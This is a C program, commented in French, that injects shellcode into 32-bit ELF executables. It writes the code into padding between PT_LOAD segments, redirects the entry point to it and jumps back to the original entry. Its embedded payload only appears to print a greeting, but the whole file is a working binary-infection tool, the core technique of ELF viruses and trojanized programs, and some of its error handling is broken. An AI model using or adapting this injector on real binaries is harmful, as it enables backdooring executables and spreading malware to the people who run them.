/*
    Code injector under ELF programs.
*/
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <elf.h>
#include <stdlib.h>
#include <errno.h>
const char shellcode[] = "\x31\xc0\x31\xdb\x31\xd2\x68\x72\x6c\x64\x21\xc6\x44\x24\x03\x0a\x68\x6f\x20\x77\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0c\xb0\x04\xb3\x01\xcd\x80\xb2\x0c\x01\xd4";

;

char jmp[] = "\xe9\xff\xff\xff\xff";                      
char pusha[] = "\x60";
char popa[] = "\x61";
#define IS_ELF32(p,s) (s > sizeof(Elf32_Ehdr) && !memcmp(ELFMAG, p, SELFMAG) && p[EI_CLASS] == ELFCLASS32)
#define CODE_SIZE (sizeof(shellcode)-1 + sizeof(jmp)-1 + sizeof(pusha)-1 + sizeof(popa)-1)
/* Sur mon système, l'adresse de base où sera mappé le fichier est 0x08048000 */
#define START_ADRESS (unsigned int) 0x08048000
#define  ABORT(...) exit(0)
	
#define CODE_OFFSET (phdr->p_offset + phdr->p_memsz)
#define CODE_ADRESS (START_ADRESS + CODE_OFFSET)
void insert_code(unsigned char *ptr)
{
    /* On insert l'instruction pusha avant notre shellcode */
    memcpy(ptr, pusha, sizeof(pusha)-1);
    ptr += sizeof(pusha)-1;
    
    /* On copie notre shellcode */
    memcpy(ptr, shellcode, sizeof(shellcode)-1);
    ptr += sizeof(shellcode)-1;
    
    /* On place l'instruction popa juste avant notre JMP */
    memcpy(ptr, popa, sizeof(popa)-1);
    ptr += sizeof(popa)-1;
    
    /* Et on termine par l'instruction JMP qui donnera la main au programme hote */
    memcpy(ptr, jmp, sizeof(jmp)-1);
}
void inject_code(unsigned char *f_mmaped, struct stat *f_stat)
{
    int i;
    Elf32_Ehdr *ehdr;
    Elf32_Phdr *phdr, *next;
    unsigned int last_entry;
    int jmp_adr;
    
    /* On fait pointer l'entête ELF sur le début du fichier */
    ehdr = (void*)f_mmaped;
    /* On sauvegarde l'ancienne entrée du programme */
    last_entry = ehdr->e_entry;
    
    /* Simple vérification du fichier */
    if((unsigned int)f_stat->st_size < (ehdr->e_phoff + ehdr->e_phnum * ehdr->e_phentsize))
        ABORT("[-] ELF malformed.");
    
    /* On fait pointer l'entête de segment sur le début de la table de segment */
    phdr = (void*)f_mmaped + ehdr->e_phoff;
    
    printf("[+] Find a free space under a PT_LOAD segment...\n");
    
    /* On recherche le premier segment PT_LOAD */
    for(i = 0; i < ehdr->e_phnum - 1; i++)
    {
        if(phdr->p_type == PT_LOAD)
            break;
        phdr++;
    }
    /* next pointe sur le prochain segment (l'entête) */
    next = phdr + 1;
    
    /* On vérifie que nous avons bien deux segments PT_LOAD */
    if(next->p_type != PT_LOAD || phdr->p_type != PT_LOAD)
        ABORT("[-] Don't found two PT_LOAD segment.");
    
    /* On vérifie que l'espace entre ces deux segments est suffisant pour y loger notre code */
    if(phdr->p_memsz != phdr->p_filesz || (CODE_OFFSET + CODE_SIZE) > (next->p_offset + phdr->p_offset))
        ABORT("[-] Don't found a free space.");
    
    printf("[+] Free space found : %d bytes.\n", (next->p_offset) - (CODE_OFFSET));    
    
    
    printf("[+] Overwrite entry point (0x%.8x) programm with shellcode adress (0x%.8x)...\n", last_entry, CODE_ADRESS);
    /* On écrase l'ancienne entrée du programme, par l'adresse où sera placé notre code */
    ehdr->e_entry = (START_ADRESS + phdr->p_offset + phdr->p_memsz);
    
    printf("[+] Inject fake jmp to last entry point...\n");
    /* On modifie l'instruction JMP pour qu'elle retourne au point d'entrée initial */
    jmp_adr = (last_entry - (ehdr->e_entry + CODE_SIZE));    
    memcpy(jmp+1, &jmp_adr, sizeof(int));
    
    printf("[+] Inject code (%d bytes) at offset %.8x (virtual adress 0x%.8x)...\n", CODE_SIZE, CODE_OFFSET, CODE_ADRESS);
    
    insert_code(f_mmaped + CODE_OFFSET);
    
    /* On augmente la taille du segment (dans l'entête ELF) où l'on a placé notre shellcode */
    printf("[+] Update segment size...\n");
    phdr->p_memsz += CODE_SIZE;
    phdr->p_filesz += CODE_SIZE;     
    
}
int main(int argc, char **argv)
{    
    int fd;
    struct stat f_stat;
    unsigned char *f_mmaped = NULL;
    
    if(argc != 2)
    {
        ABORT("[-] Usage : %s <filename>", argv[0]);
    }
    
    printf("[+] Open file %s...\n", argv[1]);
    if((fd = open(argv[1], O_RDWR)) == -1)
    {
        ABORT("[-] open");
    }
    
    if(fstat(fd, &f_stat) == -1)
    {
        ABORT("[-] fstat");
    }
    
    /* On mmap le fichier en mémoire, ce qui sera beaucoup plus simple pour le modifier */
    printf("[+] Mmap file in memory...\n");
    if((f_mmaped = mmap(NULL, f_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == NULL)
    {
        ABORT("[-] mmap");
    }
    if(!IS_ELF32(f_mmaped, (unsigned int)f_stat.st_size))
    {
        ABORT("[-] Not a ELF 32 executable.");
    }
    
    printf("[+] Starting injection...\n");
    inject_code(f_mmaped, &f_stat);
    
    if(munmap(f_mmaped, f_stat.st_size) == -1)
    {
        ABORT("[-] munmap");
    }
    
    close(fd);
    
    printf("[+] SUCCESS\n");
    return 0;
}
